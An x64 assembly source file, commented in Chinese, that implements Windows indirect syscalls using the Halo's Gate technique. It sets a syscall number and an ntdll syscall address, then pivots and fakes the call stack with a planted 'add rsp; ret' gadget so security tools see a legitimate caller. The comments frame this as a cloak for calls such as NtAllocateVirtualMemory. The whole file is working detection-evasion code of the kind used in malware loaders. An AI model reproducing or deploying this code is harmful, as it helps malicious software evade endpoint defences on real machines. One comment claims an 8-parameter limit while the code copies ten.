.intel_syntax noprefix
.global SetSSN
.global SetSyscallAddr
.global SetSpoofParams
.global RunSyscall
.global SpoofedSyscall

.data
    wSystemCall: .long 0      # 存放SSN
    qSyscallAddr: .quad 0     # 存放syscall地址
    qGadgetAddr: .quad 0      # 存放 GoldenGadgets[0].pGadgetAddress
    wStackSize: .long 0       # 存放 GoldenGadgets[0].dwStackSize

.text
SetSSN:
    xor eax, eax
    mov dword ptr [rip + wSystemCall], ecx
    ret

SetSyscallAddr:
    mov [rip + qSyscallAddr], rcx
    ret

# 新增：装载“隐身衣”参数
SetSpoofParams:
    mov [rip + qGadgetAddr], rcx       # 第一个参数传给 Gadget 地址
    mov dword ptr [rip + wStackSize], edx # 第二个参数传给 栈大小
    ret

# 原版的普通间接调用 (无栈伪造，用于不敏感的 API)
RunSyscall:
    mov r10, rcx
    mov eax, dword ptr [rip + wSystemCall]
    jmp qword ptr [rip + qSyscallAddr]

# 核心魔法：带有 Call Stack Spoofing 的间接调用
SpoofedSyscall:
    # 1. 备份现场 (The Backup) 现在栈还没有被撑开，rsp正好指向回到的main.c的retaddr
    # R11 是非易失性寄存器，我们在动 RSP 之前，把真实的栈顶存进去
    mov r11, rsp

    # 2. 撑开隐身衣 (The Pivot)
    # 读取你算好的 dwStackSize，强行把栈指针向下挪，制造伪造的栈区
    mov eax, dword ptr [rip + wStackSize]
    sub rsp, rax

    # 核心修正：抵消 ntdll 内部 ret 带来的 8 字节栈顶上升！（最后的syscall自带了一个ret，会把栈往上拉8字节）
    sub rsp, 8

    # 3. 参数搬运 (The Relocation) - The Punchline!
    # 在 x64 ABI 规范中，前 4 个参数在寄存器里，但第 5, 6, 7, 8 个参数在栈上！
    # 它们原本在 r11 + 0x28 及之后的位置。我们必须把它们复制到新栈 (rsp) 的对应位置为什么么是r11+0x28，r11是原retaddr，0x28=shadow space（windows为四个寄存器预留的32字节）+ retaddr（8字节）
    mov r10, [r11 + 0x28]  # Param 5
    mov [rsp + 0x28], r10
    mov r10, [r11 + 0x30]  # Param 6
    mov [rsp + 0x30], r10
    mov r10, [r11 + 0x38]  # Param 7
    mov [rsp + 0x38], r10
    mov r10, [r11 + 0x40]  # Param 8
    mov [rsp + 0x40], r10
    mov r10, [r11 + 0x48]  # Param 9
    mov [rsp + 0x48], r10
    mov r10, [r11 + 0x50]  # Param 10
    mov [rsp + 0x50], r10
    # (支持最多 8 个参数的 API，如 NtAllocateVirtualMemory 仅需 6 个，绰绰有余)

    # 4. 安放诱饵 (The Bait)
    # 将 "add rsp, size; ret" 的绝对地址压在当前伪造栈的最顶部
    mov r10, qword ptr [rip + qGadgetAddr]
    mov [rsp], r10

    # 5. 终极击发 (The Execution)
    # 标准的 Halo's Gate 开火流程
    mov r10, rcx
    mov eax, dword ptr [rip + wSystemCall]
    jmp qword ptr [rip + qSyscallAddr]
    # 跳转到ntdll内部执行完syscall; ret;跳回执行add rsp, size; ret;这下就跳回了我们的main.c。最初把rsp的值放进r11其实是为了传第5个及之后的参数使用